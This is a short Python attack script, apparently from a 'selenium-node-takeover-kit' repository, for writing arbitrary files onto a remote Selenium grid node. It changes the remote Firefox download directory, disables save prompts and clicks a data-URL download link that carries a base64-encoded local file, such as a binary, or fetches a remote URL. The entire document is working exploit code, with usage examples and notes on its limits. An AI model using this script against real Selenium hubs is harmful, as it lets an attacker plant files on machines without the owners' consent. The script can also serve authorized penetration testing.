#!/usr/bin/env python3
# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_upload.py
#
# You can upload a file onto a remote selenium node by changing the download folder and clicking a download link.
# Small files can be encoded and used within url inline html. Larger files should be pulled remotely.
# Limits are 1. the context of the process on the selenium node, 2. it cannot overwrite files, and 3. it doesnt seem to be able to make dot files.
#
# pip3 install selenium
# ./selenium_node_upload.py -h http://selenium-hub.lan:4444/wd/hub -r /tmp/i_was_here.txt -l /bin/ls

import base64, getopt, sys, os, urllib.request, time
from selenium import webdriver
from selenium.webdriver.remote.file_detector import UselessFileDetector

if __name__ == '__main__':
    hub_url, remote_file, local_file, url_file, mime_type, data = None, None, None, None, None, None
    myopts, args = getopt.getopt(sys.argv[1:],':h:r:l:u:m:d:')
    for o, a in myopts:
        if o == '-h':
            hub_url = a
        elif o == '-r':
            remote_file = a
        elif o == '-l':
            local_file = a
        elif o == '-u':
            url_file = a
        elif o == '-m':
            mime_type = a
        elif o == '-d':
            data = base64.b64encode(str.encode(a))

    # Just overwrite whatever is in data
    if local_file:
        with open(local_file, 'rb') as file:
            data = base64.b64encode(file.read())

    # Inline encoded or a link to an external file
    if data:
        url_file = 'data:application/octet-stream;charset=utf-16le;base64,%s' % (data.decode('utf-8'))
        mime_type = 'application/octet-stream;'
    elif url_file and not mime_type: # Buggy. 
        mime_type = urllib.request.urlopen(url_file).info().get_content_type()

    # Inline html with an inline download file link
    data_url = 'data:text/html;charset=utf-8,<html><a id=f href="%s" download="%s">f</a></html>' % ( url_file, os.path.basename(remote_file) )

    # Configure browser profile to use custom download location and not prompt to save files for mime type. This should probably be turned off by default...
    profile = webdriver.FirefoxProfile()
    profile.set_preference('browser.download.folderList', 2) # custom location
    profile.set_preference('browser.download.manager.showWhenStarting', False)
    profile.set_preference('browser.download.dir', os.path.dirname(remote_file))
    profile.set_preference('browser.helperApps.neverAsk.saveToDisk', 'application/octet-stream')
    options = webdriver.FirefoxOptions()
    options.profile = profile
    driver = webdriver.Remote( command_executor=hub_url, desired_capabilities=options.to_capabilities() )

    # Load the data URL and click the download link
    try:
        driver.get(data_url)
        driver.find_element_by_id('f').click()
    finally:
        driver.quit()
    sys.exit(0)
